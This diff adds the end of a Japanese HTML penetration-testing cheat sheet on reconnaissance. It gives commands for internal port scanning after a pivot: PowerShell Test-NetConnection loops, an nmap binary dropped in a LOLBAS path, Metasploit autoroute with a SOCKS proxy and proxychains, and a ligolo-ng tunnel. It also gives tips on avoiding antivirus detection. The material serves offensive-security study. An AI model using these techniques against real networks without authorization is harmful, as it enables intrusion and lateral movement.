+  | Select -ExpandProperty openPorts</code></pre></div>
+
+      <p><strong>PowerShell ネイティブ (Test-NetConnection):</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># 単一ホスト・複数ポート</span>
+1..1024 | ForEach-Object {
+    $r = Test-NetConnection -ComputerName 10.10.20.10 -Port $_ \
+      -WarningAction SilentlyContinue -InformationLevel Quiet
+    if ($r) { "Port $_ open" }
+}
+
+<span class="c"># レンジスキャン (主要ポート)</span>
+$ports = 21,22,80,135,139,389,443,445,1433,3306,3389,5985,8080
+1..254 | ForEach-Object {
+    $ip = "10.10.20.$_"
+    foreach ($port in $ports) {
+        $r = Test-NetConnection -ComputerName $ip -Port $port \
+          -WarningAction SilentlyContinue -InformationLevel Quiet
+        if ($r) { "$ip`:$port open" }
+    }
+}</code></pre></div>
+
+      <p><strong>転送済み nmap:</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">text</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Windows 版 nmap を書込可能な LOLBAS パスに配置</span>
+C:\Windows\Tasks\nmap.exe -p 445,3389 --open 10.10.20.0/24</code></pre></div>
+
+      <h3>Kali 側からのトンネル経由スキャン</h3>
+      <p><strong>Metasploit autoroute + SOCKS:</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Meterpreter セッション内</span>
+meterpreter> run autoroute -s 10.10.20.0/24
+meterpreter> background
+
+msf> use auxiliary/server/socks_proxy
+msf> set VERSION 4a
+msf> set SRVPORT 1080
+msf> run -j
+
+<span class="c"># /etc/proxychains4.conf: socks4 127.0.0.1 1080</span>
+proxychains nmap -sT -Pn -n --max-retries 1 -p 445,3389,5985 10.10.20.0/24</code></pre></div>
+
+      <p><strong>ligolo-ng 経由 (高速、推奨):</strong> proxy/agent の setup は lateral-movement sheet 参照。tunnel 確立後は proxychains 不要で直接 nmap が通る。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># tunnel 確立後の直接スキャン</span>
+sudo ip route add 10.10.20.0/24 dev ligolo
+sudo nmap -sT -Pn -n 10.10.20.0/24 -p 445,3389,5985</code></pre></div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>偵察は kill chain の最上流。ここでの取得情報が下流の全 sheet (AD / lateral / web / evasion) の手法選択を決める</li>
+          <li>UDP スキャンは省略しやすいが SNMP / DNS / NetBIOS など UDP 側にしかない発見が多い、必ず含める</li>
+          <li>外部から見える enumeration (SMB null session / SNMP public / anonymous LDAP) は環境の防御レベルの指標</li>
+          <li>SPN / LAPS / kerberoast 候補は LDAP 段階で既に取得できる、AD sheet の攻撃実行前に情報を蓄積</li>
+          <li>ピボット後は Windows 内で PowerShell native (<code>Test-NetConnection</code>) を優先し、外部 nmap 転送は最小化 (LOLBAS / AV 検知リスク回避)</li>
+          <li>tunnel の種類 (SOCKS via proxychains / ligolo-ng L3 route) でスキャン速度と対象範囲が変わる、環境に応じて選択</li>
+          <li>ホスト間ピボットの都度、Section 01 (環境変数の再設定) と Section 02 (host discovery) を各セグメントで再実行</li>
+        </ul>
+      </div>
+    </section>
+
+  </article>
+</div>
+</div>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Reconnaissance</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
+
+<script src="../content.js"></script>
+<script src="../assets/js/sheet.js"></script>
+</body>
+</html>
